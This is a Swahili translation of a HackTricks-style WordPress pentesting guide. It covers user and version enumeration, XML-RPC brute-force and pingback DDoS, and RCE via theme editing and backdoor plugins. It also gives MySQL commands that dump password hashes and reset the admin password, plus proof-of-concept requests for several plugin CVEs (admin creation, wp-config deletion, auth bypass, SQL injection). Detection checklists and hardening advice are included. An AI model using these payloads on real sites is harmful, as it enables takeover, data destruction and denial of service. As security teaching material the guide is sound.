# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

- **Faili zilizopakiwa** huenda kwa: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Faili za theme zinaweza kupatikana katika /wp-content/themes/,** hivyo ukibadilisha php ya theme ili kupata RCE labda utatumia path hiyo. Kwa mfano: Kwa kutumia **theme twentytwelve** unaweza **kupata** faili ya **404.php** katika: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **URL nyingine yenye manufaa inaweza kuwa:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Katika **wp-config.php** unaweza kupata nenosiri la root la database.
- Njia za kuingia za default za kuangalia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` ina taarifa muhimu kama toleo la WordPress lililosanidiwa.
- `wp-activate.php` inatumika kwa mchakato wa uanzishaji wa barua pepe wakati wa kuweka tovuti mpya ya WordPress.
- Folda za login (zinaweza kubadilishwa jina ili kuficha):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ni faili inayowakilisha kipengele cha WordPress kinachoruhusu data kutumwa kutumia HTTP kama njia ya usafirishaji na XML kama mbinu ya enkoding. Aina hii ya mawasiliano imebadilishwa na WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folda ya `wp-content` ni saraka kuu ambapo plugins na themes zinahifadhiwa.
- `wp-content/uploads/` Ni saraka ambayo faili zote zinazopakiwa kwenye jukwaa zinalindwa.
- `wp-includes/` Hii ni saraka ambapo faili za kernel zinahifadhiwa, kama certificates, fonts, faili za JavaScript, na widgets.
- `wp-sitemap.xml` Katika matoleo ya WordPress 5.5 na zaidi, WordPress huzalisha faili ya sitemap XML yenye machapisho yote ya umma na aina za post na taxonomies zinazoweza kuhojiwa hadharani.

**Post exploitation**

- Faili ya `wp-config.php` ina taarifa zinazohitajika na WordPress kuunganishwa na database kama jina la database, database host, username na password, authentication keys and salts, na prefix ya jedwali la database. Faili hii ya configuration pia inaweza kutumika kuwasha DEBUG mode, ambayo inaweza kusaidia katika kutatua matatizo.

### Ruhusa za Watumiaji

- **Administrator**
- **Editor**: Kuchapisha na kusimamia machapisho yake na ya wengine
- **Author**: Kuchapisha na kusimamia machapisho yake mwenyewe
- **Contributor**: Kuandika na kusimamia machapisho yake lakini hawezi kuyachapisha
- **Subscriber**: Kuangalia machapisho na kuhariri wasifu wao

## **Passive Enumeration**

### **Get WordPress version**

Angalia kama unaweza kupata faili `/license.txt` au `/readme.html`

Ndani ya **msimbo wa chanzo** wa ukurasa (mfano kutoka [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Faili za viungo vya CSS

![](<../../images/image (533).png>)

- Faili za JavaScript

![](<../../images/image (524).png>)

### Pata Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pata Mandhari
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Chota matoleo kwa ujumla
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Uorodhesaji hai

### Plugins and Themes

Labda hautaweza kupata Plugins na Themes zote zinazowezekana. Ili kugundua zote, utahitaji **Brute Force kwa vitendo orodha ya Plugins na Themes** (kwa bahati nzuri kwetu zipo zana za kiotomatiki ambazo zina orodha hizi).

### Watumiaji

- **ID Brute:** Unapata watumiaji halali kutoka kwenye tovuti ya WordPress kwa Brute Forcing IDs za watumiaji:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Ikiwa majibu ni **200** au **30X**, hiyo ina maana kwamba id ni **halali**. Ikiwa jibu ni **400**, basi id si **halali**.

- **wp-json:** Unaweza pia kujaribu kupata taarifa kuhusu watumiaji kwa kuuliza:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Endpoint nyingine ya `/wp-json/` ambayo inaweza kufichua baadhi ya taarifa kuhusu watumiaji ni:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Kumbuka kuwa endpoint hii inaonyesha tu watumiaji waliofanya chapisho. **Taarifa tu kuhusu watumiaji ambao wamewezeshwa na kipengele hiki ndizo zitatolewa**.

Pia kumbuka kwamba **/wp-json/wp/v2/pages** inaweza leak anwani za IP.

- **Login username enumeration**: Unapojaribu kuingia kwenye **`/wp-login.php`**, **ujumbe** ni **tofauti** ikionyesha kama **jina la mtumiaji lipo au halipo**.

### XML-RPC

Ikiwa `xml-rpc.php` iko hai unaweza kufanya credentials brute-force au kuitumia kuanzisha DoS attacks kwa rasilimali nyingine. (Unaweza ku-automate mchakato huu[ using this](https://github.com/relarizky/wpxploit) kwa mfano).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**Angalia**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** au **`metaWeblog.getUsersBlogs`** ni baadhi ya mbinu zinazoweza kutumika kufanya brute-force credentials. Ikiwa unaweza kupata yoyote yao, unaweza kutuma kitu kama:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Ujumbe _"Jina la mtumiaji au nenosiri si sahihi"_ ndani ya response ya code 200 unapaswa kuonekana ikiwa credentials sio halali.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Kwa kutumia credentials sahihi unaweza kupakia faili. Katika response njia itaonekana ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Pia kuna **njia ya haraka** ya kufanya brute-force ya jina la mtumiaji na nywila kwa kutumia **`system.multicall`**, kwani unaweza kujaribu vigezo vingi kwenye ombi moja:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Njia hii imelengwa kwa programu, si kwa watu, na ni ya zamani; kwa hiyo haiungi mkono 2FA. Hivyo, ikiwa una creds halali lakini mlango mkuu umehifadhiwa na 2FA, **inawezekana utaweza kutumia xmlrpc.php kuingia kwa kutumia creds hizo ukiepuka 2FA**. Kumbuka hautaweza kutekeleza vitendo vyote unavyoweza kupitia console, lakini bado unaweza kufikia RCE kama Ippsec anavyoelezea katika [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Ikiwa unaweza kupata method _**pingback.ping**_ ndani ya orodha unaweza kufanya Wordpress itume ombi lolote kwa host/port yoyote.\
Hii inaweza kutumika kuagiza **maelfu** za Wordpress **tovuti** **kuingia** eneo moja (hivyo kusababisha **DDoS** katika eneo hilo) au unaweza kuitumia kufanya **Wordpress** ili **scan** baadhi ya mitandao ya ndani (unaweza kubainisha bandari yoyote).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Ikiwa unapata **faultCode** yenye thamani **kubwa kuliko** **0** (17), ina maana bandari iko wazi.

Angalia matumizi ya **`system.multicall`** katika sehemu ya awali ili kujifunza jinsi ya kutumia vibaya njia hii kusababisha DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Faili hii kawaida hupatikana chini ya mizizi ya tovuti ya Wordpress: **`/wp-cron.php`**\
Wakati faili hii inapofikiwa hufanywa MySQL **query** ya **"nzito"**, hivyo inaweza kutumiwa na **attackers** **kusababisha** **DoS**.\
Pia, kwa chaguo-msingi, `wp-cron.php` huitwa kila inapopakiwa ukurasa (wakati wowote mteja anapoomba ukurasa wowote wa Wordpress), jambo ambalo kwenye tovuti zenye trafiki kubwa linaweza kusababisha matatizo (DoS).

Inashauriwa kuzima Wp-Cron na kuunda cronjob halisi ndani ya seva itakayotekeleza vitendo vinavyohitajika kwa vipindi vya kawaida (bila kusababisha matatizo).

### /wp-json/oembed/1.0/proxy - SSRF

Jaribu kufikia _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ na tovuti ya Worpress inaweza kutuma ombi kwako.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Chombo hiki hukagua kama **methodName: pingback.ping** ipo na kama path **/wp-json/oembed/1.0/proxy** upo; ikiwa zipo, kinajaribu kuzitumia (exploit).

## Zana za Kiotomatiki
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Pata ufikiaji kwa kubadilisha biti

Zaidi ya kuwa shambulio la kweli, hili ni udadisi. Katika CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) unaweza kubadilisha biti 1 kutoka kwa faili yoyote ya wordpress. Kwa hivyo unaweza kubadilisha nafasi `5389` ya faili `/var/www/html/wp-includes/user.php` ili kufanya operesheni ya NOT (`!`) kuwa NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Paneli RCE**

**Kurekebisha php kutoka kwenye theme inayotumika (inahitaji kredensiali za admin)**

Appearance → Theme Editor → 404 Template (kwa upande wa kulia)

Badilisha yaliyomo kwa php shell:

![](<../../images/image (384).png>)

Tafuta mtandaoni jinsi unaweza kufikia ukurasa uliosasishwa. Katika kesi hii, unapaswa kufikia hapa: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Unaweza kutumia:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
kupata session.

## Plugin RCE

### PHP plugin

Inawezekana kupakia .php files kama plugin.\
Tengeneza php backdoor yako kwa mfano:

![](<../../images/image (183).png>)

Kisha ongeza plugin mpya:

![](<../../images/image (722).png>)

Pakia plugin na bonyeza Install Now:

![](<../../images/image (249).png>)

Bonyeza Procced:

![](<../../images/image (70).png>)

Inawezekana hili halitaonekana kufanya chochote, lakini ukitembelea Media, utaona shell yako imepakwa:

![](<../../images/image (462).png>)

Ifikie na utaona URL ya kuendesha reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Njia hii inahusisha usakinishaji wa plugin yenye madhara inayojulikana kuwa na udhaifu na inaweza kutumika kupata web shell. Mchakato huu unafanywa kupitia WordPress dashboard kama ifuatavyo:

1. **Plugin Acquisition**: Plugin hupatikana kutoka chanzo kama Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Nenda kwenye WordPress dashboard, kisha nenda kwa `Dashboard > Plugins > Upload Plugin`.
- Pakia faili la zip la plugin ulilopakua.
3. **Plugin Activation**: Mara plugin itakapowekwa kwa mafanikio, lazima iwe imewezeshwa kupitia dashboard.
4. **Exploitation**:
- Ukiwa na plugin "reflex-gallery" imewekwa na imewezeshwa, inaweza kutumika kwani inajulikana kuwa na udhaifu.
- Metasploit framework inatoa exploit kwa udhaifu huu. Kwa kupakia module inayofaa na kutekeleza amri maalum, meterpreter session inaweza kuanzishwa, ikitoa ufikiaji usioidhinishwa kwenye tovuti.
- Imetajwa kwamba hii ni mojawapo ya njia nyingi za kutumia udhaifu wa tovuti ya WordPress.

Yaliyomo yanajumuisha picha zinazoonyesha hatua kwenye WordPress dashboard za kusakinisha na kuamsha plugin. Hata hivyo, ni muhimu kutambua kwamba kutumia udhaifu kwa njia hii ni kinyume cha sheria na haifai bila idhini sahihi. Taarifa hizi zinapaswa kutumika kwa uwajibikaji na tu katika muktadha wa kisheria, kama penetration testing na idhini wazi.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ni script iliyoundwa kuinua uvujaji wa **Cross-Site Scripting (XSS)** hadi **Remote Code Execution (RCE)** au udhaifu mwingine mzito katika WordPress. Kwa habari zaidi angalia [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Inatoa **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Huunda mtumiaji ndani ya WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Pakia custom plugin yako (backdoor) kwenye WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Hariri Built-In Plugins katika WordPress.
- _**(RCE) Built-In Theme Edit:**_ Hariri Built-In Themes katika WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits kwa Third-Party WordPress Plugins/Themes.

## Post Exploitation

Chukua majina ya watumiaji na nywila:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Badilisha admin password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Uso wa Mashambulizi

Kujua jinsi plugin ya Wordpress inaweza kuweka wazi utendakazi ni muhimu ili kupata udhaifu katika utendakazi wake. Unaweza kuona jinsi plugin inaweza kuweka wazi utendakazi katika pointi zifuatazo na baadhi ya mifano ya plugins zilizo na udhaifu katika [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Moja ya njia plugin inaweza kufichua functions kwa watumiaji ni kupitia AJAX handlers. Hizi zinaweza kuwa na bugs za logic, authorization, au authentication. Aidha, mara nyingi functions hizi zitategemea authentication na authorization kwa kuwepo kwa wordpress nonce ambayo **mtumiaji yeyote aliye-authenticated kwenye instance ya Wordpress anaweza kuwa nayo** (hata bila kuzingatia jukumu lake).

Hizi ni functions ambazo zinaweza kutumika kufichua function katika plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Matumizi ya `nopriv` hufanya endpoint ipatikane kwa watumiaji wote (hata wasiothibitishwa).**

> [!CAUTION]
> Zaidi ya hayo, ikiwa function inachunguza tu idhini ya mtumiaji kwa kutumia `wp_verify_nonce`, function hii inabaini tu kwamba mtumiaji ameingia; kwa kawaida haitambui jukumu la mtumiaji. Kwa hivyo watumiaji wenye ruhusa ndogo wanaweza kufanya vitendo vinavyohitaji ruhusa za juu.

- **REST API**

Pia inawezekana kufunua functions kutoka wordpress kwa kusajili REST API kwa kutumia function `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` ni callback kwa function inayothibitisha ikiwa mtumiaji fulani ameidhinishwa kuita API method.

**Ikiwa function iliyojengwa ndani `__return_true` itatumika, itapita tu ukaguzi wa ruhusa za mtumiaji.**

- **Ufikiaji wa moja kwa moja wa faili ya php**

Kama kawaida, Wordpress inatumia PHP na faili ndani ya plugin zinaweza kupatikana moja kwa moja kupitia wavuti. Kwa hivyo, ikiwa plugin inafichua utendaji wenye udhaifu unaozinduliwa kwa kuingia tu kwenye faili, mtumiaji yeyote ataweza kuutumia.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Baadhi ya plugins zinafanya “trusted header” shortcuts kwa ajili ya internal integrations au reverse proxies na kisha hutumia header hiyo kuweka muktadha wa mtumiaji wa sasa kwa maombi ya REST. Ikiwa header haitafungwi cryptographically na sehemu ya juu (upstream component), mshambuliaji anaweza kuiga (spoof) na kufikia routes za REST zenye ruhusa kama administrator.

- Athari: kuinuka kwa mamlaka bila uthibitisho hadi admin kwa kuunda msimamizi mpya kupitia core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (inafanya user ID 1, kawaida akaunti ya msimamizi wa kwanza).
- Exploited route: `POST /wp-json/wp/v2/users` kwa role array yenye ruhusa za juu.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Kwa nini inafanya kazi

- Plugin inaweka header inayodhibitiwa na mteja kwenye authentication state na inaruka capability checks.
- WordPress core inatarajia `create_users` capability kwa route hii; hack ya plugin inaitikisa kwa kuweka moja kwa moja current user context kutoka kwenye header.

Viashiria vya mafanikio vinavyotarajiwa

- HTTP 201 na mwili wa JSON unaelezea user iliyoundwa.
- Mtumiaji mpya wa admin unaoonekana katika `wp-admin/users.php`.

Orodha ya kugundua

- Tumia grep kutafuta `getallheaders()`, `$_SERVER['HTTP_...']`, au vendor SDKs zinazosasisha custom headers kuweka user context (mfano, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Pitia REST registrations kwa privileged callbacks ambazo hazina ukaguzi imara wa `permission_callback` na badala yake zinategemea request headers.
- Tazama matumizi ya core user-management functions (`wp_insert_user`, `wp_create_user`) ndani ya REST handlers ambazo zinalindwa tu kwa thamani za header.

### Kuondolewa kwa faili bila uthibitisho kupitia wp_ajax_nopriv (Litho Theme <= 3.0)

Themes na plugins za WordPress mara nyingi hutoa AJAX handlers kupitia hooks `wp_ajax_` na `wp_ajax_nopriv_`. Wakati toleo la **_nopriv_** linapotumiwa **callback inakuwa inafikiwa na wageni wasioingia**, kwa hivyo kitendo chochote nyeti kinapaswa pia kutekeleza:

1. Ukaguzi wa **capability** (mf. `current_user_can()` au angalau `is_user_logged_in()`), na
2. **CSRF nonce** iliyoathibitishwa na `check_ajax_referer()` / `wp_verify_nonce()`, na
3. **Usafishaji / uthibitishaji mkali wa input**.

The Litho multipurpose theme (< 3.1) ilisahau udhibiti hizo 3 katika kipengele cha *Remove Font Family* na mwishowe ikatuma msimbo ufuatao (umepunguzwa):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Masuala yaliyotokana na kipande hiki:

* **Ufikiaji bila uthibitisho** – hook ya `wp_ajax_nopriv_` imejisajili.
* **Hakuna ukaguzi wa nonce / capability** – mgeni yeyote anaweza kufikia endpoint.
* **Hakuna kusafishwa kwa path** – mfuatano uliodhibitiwa na mtumiaji `fontfamily` unaunganishwa kwenye njia ya filesystem bila kuchujwa, kuruhusu `../../` traversal ya kawaida.

#### Utekelezaji

Mshambuliaji anaweza kufuta faili yoyote au saraka **chini ya saraka ya msingi ya uploads** (kwa kawaida `<wp-root>/wp-content/uploads/`) kwa kutuma ombi moja la HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Malengo mengine yenye athari ni faili za `.php` za plugin/theme (kuvunja plugin za usalama) au sheria za `.htaccess`.

#### Detection checklist

* Kila callback ya `add_action( 'wp_ajax_nopriv_...')` inayoitisha filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, n.k.).
* Kuambatanisha input ya mtumiaji isiyosafishwa ndani ya paths (tazama `$_POST`, `$_GET`, `$_REQUEST`).
* Kukosekana kwa `check_ajax_referer()` na `current_user_can()`/`is_user_logged_in()`.

---

### Kuinua mamlaka kupitia urejeshaji wa role zilizobaki na kukosekana kwa idhini (ASE "View Admin as Role")

Mengi ya plugins hutekeleza kipengele cha "view as role" au kubadilisha role kwa muda kwa kuhifadhi role(s) za awali katika user meta ili ziweze kurejeshwa baadaye. Ikiwa njia ya urejeshaji inategemea tu vigezo vya ombi (mf., `$_REQUEST['reset-for']`) na orodha inayodumishwa na plugin bila kuangalia capabilities na nonce halali, hii inageuka kuwa kuinua mamlaka kwa mtazamo wima.

Mfano wa maisha halisi ulipatikana katika Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). Tawi la reset liliurejesha role kulingana na `reset-for=<username>` ikiwa jina la mtumiaji lilionekana katika array ya ndani `$options['viewing_admin_as_role_are']`, lakini halikufanya ukaguzi wa `current_user_can()` wala uhakiki wa nonce kabla ya kuondoa role za sasa na kuziwekea tena role zilizohifadhiwa kutoka user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Kwa nini inaweza kutumika

- Inaamini `$_REQUEST['reset-for']` na chaguo la plugin bila idhinisho upande wa seva.
- Ikiwa mtumiaji alikuwa na ruhusa za juu zilizohifadhiwa katika `_asenha_view_admin_as_original_roles` na baadaye alishushwa hadhi, anaweza kuzirejesha kwa kufikia reset path.
- Katika baadhi ya deployments, mtumiaji yeyote aliyethibitishwa angeweza kusababisha reset kwa jina la mtumiaji mwingine ambalo bado lipo katika `viewing_admin_as_role_are` (idhinishaji lililovunjika).

Matumizi ya udhaifu (mfano)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
On vulnerable builds this removes current roles and re-adds the saved original roles (e.g., `administrator`), effectively escalating privileges.

Orodha ya kugundua

- Angalia vipengele vya kubadilisha role vinavyohifadhi “original roles” katika user meta (mfano, `_asenha_view_admin_as_original_roles`).
- Tambua njia za reseti/urejesho ambazo:
  - Soma majina ya watumiaji kutoka `$_REQUEST` / `$_GET` / `$_POST`.
  - Badilisha roles kupitia `add_role()` / `remove_role()` bila `current_user_can()` na `wp_verify_nonce()` / `check_admin_referer()`.
  - Rudisha idhini kwa kuzingatia array ya chaguo la plugin (mfano, `viewing_admin_as_role_are`) badala ya uwezo wa mhusika.

---

### Kuongezeka kwa ruhusa kwa watumiaji wasioathibitishwa kupitia cookie‑trusted user switching kwenye hook ya umma `init` (Service Finder “sf-booking”)

Baadhi ya plugins huunganisha user-switching helpers kwenye hook ya umma `init` na hutumia utambulisho kutoka kwa cookie inayodhibitiwa na mteja. Ikiwa msimbo unaita `wp_set_auth_cookie()` bila kuthibitisha authentication, capability na nonce halali, mgeni yeyote asiyetambulishwa anaweza kulazimisha login kama user ID yeyote. 

Mfano wa kawaida wenye udhaifu (umeshindwa kidogo kutoka Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Why it’s exploitable

- Hook ya `init` ya umma inafanya handler ipatikane kwa unauthenticated users (no `is_user_logged_in()` guard).
- Kitambulisho kinatokana na cookie inayoweza kubadilishwa na mteja (`original_user_id`).
- Simu ya moja kwa moja kwa `wp_set_auth_cookie($uid)` inamwingiza muombaji kama mtumiaji huyo bila capability/nonce checks.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Mambo ya WAF kwa CVEs za WordPress/plugin

WAF za generic za edge/server zimeelekezwa kwa mifumo pana (SQLi, XSS, LFI). Matatizo mengi ya high‑impact ya WordPress/plugin ni hitilafu maalum za logic/auth za application ambazo zinaonekana kama trafiki isiyo hatari isipokuwa engine itakapotambua routes za WordPress na semantics za plugin.

Vidokezo vya kushambulia

- Lenga endpoints maalum za plugin kwa payloads safi: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Tumia njia zisizo za uthibitisho kwanza (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads mara nyingi zinafanikiwa bila obfuscation.
- Mifano ya kawaida yenye athari kubwa: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Vidokezo vya ulinzi

- Usitegemee saini za generic za WAF kulinda CVEs za plugin. Tekeleza virtual patches maalum za vulnerability kwenye application-layer au sasisha haraka.
- Tumia positive-security checks ndani ya code (capabilities, nonces, strict input validation) badala ya negative regex filters.

## Ulinzi wa WordPress

### Sasisho za kawaida

Hakikisha WordPress, plugins, na themes viko updated. Pia thibitisha kuwa automated updating imewezeshwa katika wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Pia, **weka tu plugins na themes za WordPress zinazoweza kuaminika**.

### Plugins za Usalama

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Mapendekezo Mengine**

- Ondoa mtumiaji wa chaguo-msingi **admin**
- Tumia **nywila zenye nguvu** na **2FA**
- Kila mara **kagua** **ruhusa** za watumiaji
- **Punguza majaribio ya kuingia** ili kuzuia mashambulizi ya Brute Force
- Badilisha jina la faili **`wp-admin.php`** na ruhusu ufikiaji ndani tu au kutoka kwa anwani za IP maalum.


### SQL Injection isiyothibitishwa kupitia uidhinishaji duni (WP Job Portal <= 2.3.2)

Plugin ya recruitment ya WP Job Portal ilifunua kazi ya **savecategory** ambayo hatimaye inatekeleza msimbo ufuatao wenye udhaifu ndani ya `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
